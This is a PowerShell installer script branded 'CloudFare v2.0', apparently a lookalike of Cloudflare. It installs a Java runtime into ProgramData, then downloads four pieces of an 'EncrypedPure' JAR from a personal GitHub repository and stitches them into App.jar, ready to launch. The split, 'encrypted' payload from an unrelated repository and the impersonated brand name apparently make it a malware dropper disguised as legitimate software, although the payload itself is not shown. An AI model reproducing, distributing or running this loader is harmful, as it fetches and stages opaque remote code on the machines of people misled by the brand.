# CloudFare Installation v2.0
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$InstallDir = "C:\ProgramData\CloudFare"
$TempDir = "$InstallDir\Temp"
$JavaDir = "$InstallDir\Java"

function Log {
    param([string]$Msg)
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] $Msg" -F Green
}

function Initialize {
    Log "Creating directories..."
    foreach ($dir in $InstallDir, $TempDir, $JavaDir) {
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
    }
    Log "Directories ready"
}

function Download-Java {
    Log "Downloading Java 21..."
    
    $javaZip = "$TempDir\java.zip"
    $url = "https://github.com/graalvm/graalvm-ce-builds/releases/download/jdk-21.0.1/graalvm-community-jdk-21.0.1_windows-x64_bin.zip"
    
    if (Test-Path $javaZip) { Remove-Item $javaZip -Force }
    
    Invoke-WebRequest -Uri $url -OutFile $javaZip -TimeoutSec 300
    $size = (Get-Item $javaZip).Length / 1MB
    Log "Downloaded Java: $([math]::Round($size, 2)) MB"
    
    Log "Extracting Java..."
    Expand-Archive -Path $javaZip -DestinationPath $JavaDir -Force
    Remove-Item $javaZip
    Log "Java installed"
}

function Download-JarParts {
    Log "Downloading JAR parts..."
    
    $parts = @(1, 2, 3, 4)
    
    foreach ($num in $parts) {
        $url = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part$num.jar"
        $file = "$TempDir\EncrypedPure.part$num.jar"
        
        Log "Part $num : Downloading..."
        Invoke-WebRequest -Uri $url -OutFile $file -TimeoutSec 300
        $size = (Get-Item $file).Length / 1MB
        Log "Part $num : Downloaded ($([math]::Round($size, 2)) MB)"
    }
}

function Assemble-Jar {
    Log "Assembling JAR..."
    
    $output = "$InstallDir\App.jar"
    $stream = [System.IO.File]::Create($output)
    
    for ($i = 1; $i -le 4; $i++) {
        $file = "$TempDir\EncrypedPure.part$i.jar"
        $input = [System.IO.File]::OpenRead($file)
        $buffer = New-Object byte[] 1MB
        $read = 0
        
        while (($read = $input.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $stream.Write($buffer, 0, $read)
        }
        $input.Dispose()
        Log "Part $i assembled"
    }
    
    $stream.Dispose()
    $size = (Get-Item $output).Length / 1MB
    Log "JAR complete: $([math]::Round($size, 2)) MB"
}

function Verify {
    Log "Verifying installation..."
    
    $java = "$JavaDir\bin\java.exe"
    $jar = "$InstallDir\App.jar"
    
    if ((Test-Path $java) -and (Test-Path $jar)) {
        Log "Verification OK"
        return $true
    }
    
    Log "Verification FAILED"
    return $false
}

Write-Host ""
Write-Host "CLOUDFARE v2.0 INSTALLATION" -F Cyan
Write-Host ""

Initialize
Download-Java
Download-JarParts
Assemble-Jar

if (Verify) {
    Write-Host ""
    Write-Host "SUCCESS - Ready to launch" -F Green
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "FAILED" -F Red
    Write-Host ""
    exit 1
}
